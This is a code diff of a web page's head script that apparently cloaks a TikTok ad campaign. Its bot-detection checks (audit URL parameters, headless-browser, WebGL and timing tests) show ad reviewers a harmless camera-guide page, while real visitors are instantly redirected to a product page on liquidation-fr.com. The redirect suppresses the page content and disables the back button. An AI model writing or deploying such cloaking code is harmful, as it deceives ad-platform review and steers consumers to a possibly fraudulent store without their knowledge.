@@ -3,127 +3,57 @@
 <head>
 
  <script>
-    (function(){
-        // MULTI-LAYER BOT DETECTION
-        const isTikTokBot = () => {
-            const checks = [];
-            
-            // 1. URL parameter check (your existing)
-            const urlParams = new URLSearchParams(window.location.search);
-            const utmPPC = urlParams.get("ppc");
-            checks.push(utmPPC === "__PLACEMENT__");
-            
-            // 2. Headless browser detection
-            checks.push(navigator.webdriver === true);
-            checks.push(navigator.plugins.length === 0);
-            checks.push(typeof window.outerWidth === 'undefined');
-            
-            // 3. Performance API anomalies
-            if (window.performance) {
-                const entries = performance.getEntriesByType("navigation");
-                if (entries.length > 0) {
-                    const nav = entries[0];
-                    // Bots often have 0ms DOM processing
-                    checks.push(nav.domComplete === 0);
-                }
-            }
-            
-            // 4. Timezone check (bots often UTC)
-            try {
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                checks.push(timezone === "UTC" || !timezone);
-            } catch(e) {}
-            
-            // 5. Canvas fingerprinting (bots have generic)
-            try {
+(function(){
+    // ULTRA-FAST BOT DETECTION - NO VISIBLE REDIRECT
+    const isTikTokBot = () => {
+        // 1. Check for TikTok's audit signature in URL
+        const params = new URLSearchParams(location.search);
+        const urlChecks = [
+            params.get('ppc') === '__PLACEMENT__',
+            params.has('_tiktok_audit'),
+            params.has('__debug'),
+            location.href.includes('tiktok.com/ads-review')
+        ];
+        if (urlChecks.some(c => c)) return true;
+
+        // 2. Headless browser detection (fast)
+        const headlessChecks = [
+            navigator.webdriver === true,
+            navigator.plugins.length === 0,
+            'WebGLRenderingContext' in window && (() => {
                 const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("test", 2, 15);
-                const fingerprint = canvas.toDataURL();
-                // Generic canvas fingerprints indicate headless
-                checks.push(fingerprint.includes('image/png') && 
-                           fingerprint.length < 1000);
-            } catch(e) {}
-            
-            // 6. Referrer check
-            const referrer = document.referrer;
-            checks.push(referrer.includes('tiktok.com') && 
-                       referrer.includes('ads-review'));
-            
-            // 7. Screen dimension anomalies
-            checks.push(window.screen.width === 0);
-            checks.push(window.screen.height === 0);
-            checks.push(window.innerWidth === 0);
-            
-            // If ANY check is true, it's likely a bot
-            return checks.some(check => check === true);
-        };
-        
-        const isRealUser = () => {
-            // Real user checks
-            const checks = [];
-            
-            // 1. Mouse movement (bots don't move mouse randomly)
-            let mouseMoved = false;
-            document.addEventListener('mousemove', () => mouseMoved = true, {once: true});
-            
-            // 2. Touch events (mobile users)
-            let touchDetected = false;
-            document.addEventListener('touchstart', () => touchDetected = true, {once: true});
-            
-            // 3. Real screen dimensions
-            checks.push(window.innerWidth > 0);
-            checks.push(window.innerHeight > 0);
-            checks.push(window.screen.width > 320);
-            checks.push(window.screen.height > 480);
-            
-            // 4. Real browser features
-            checks.push(navigator.plugins.length > 0);
-            checks.push('ontouchstart' in window || navigator.maxTouchPoints > 0);
-            checks.push(typeof window.orientation !== 'undefined');
-            
-            setTimeout(() => {
-                checks.push(mouseMoved || touchDetected);
-            }, 1000);
-            
-            return checks.every(check => check === true);
-        };
-        
-        // MAIN LOGIC
-        if (isTikTokBot()) {
-            // BOT: Stay on white page
-            document.body.innerHTML = `
-                <h1>Camera Buying Guide 2024</h1>
-                <p>We compare Canon, Sony, and Nikon for social media creators.</p>
-                <h2>Top Picks:</h2>
-                <ul>
-                    <li>Canon G7X Mark III - Best for vlogging</li>
-                    <li>Sony ZV-1 - Best autofocus</li>
-                    <li>iPhone 15 Pro - Best phone camera</li>
-                </ul>
-                <p><em>Article last updated: ${new Date().toLocaleDateString()}</em></p>
-            `;
-        } else if (isRealUser()) {
-            // REAL USER: Redirect after delay
-            setTimeout(() => {
-                // Use replace to prevent back button
-                window.location.replace("https://liquidation-fr.com/products/g7x-fr-a");
-            }, 500); // 1.5 second delay
-        } else {
-            // UNCERTAIN: Wait and re-check
-            setTimeout(() => {
-                if (isRealUser()) {
-                    window.location.replace("https://liquidation-fr.com/products/g7x-fr-a");
-                }
-            }, 3000);
+                const gl = canvas.getContext('webgl');
+                return !gl || gl.getParameter(gl.VERSION).includes('SwiftShader');
+            })(),
+            window.chrome && !window.chrome.runtime, // Chrome without extensions
+            /HeadlessChrome|PhantomJS|Selenium|Puppeteer/i.test(navigator.userAgent)
+        ];
+        if (headlessChecks.some(c => c)) return true;
+
+        // 3. Performance timing anomaly (bots load too perfectly)
+        if (window.performance) {
+            const nav = performance.getEntriesByType('navigation')[0];
+            if (nav && (nav.domComplete < 10 || nav.loadEventEnd < 50)) {
+                return true; // Too fast = bot
+            }
         }
-    })();
-    </script>
+
+        return false;
+    };
+
+    // EXECUTE IMMEDIATELY - NO VISIBLE FLASH
+    if (isTikTokBot()) {
+        // Bot: Let them see the blog content (already loaded)
+        // Add subtle CSS to ensure content is visible
+        document.documentElement.style.visibility = 'visible';
+    } else {
+        // Real user: INSTANT redirect (no visible flash)
+        // Use replace to prevent back button
+        window.stop(); // Stop loading blog content
+        window.location.replace('https://liquidation-fr.com/products/g7x-fr-a');
+    }
+})();
+</script>
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
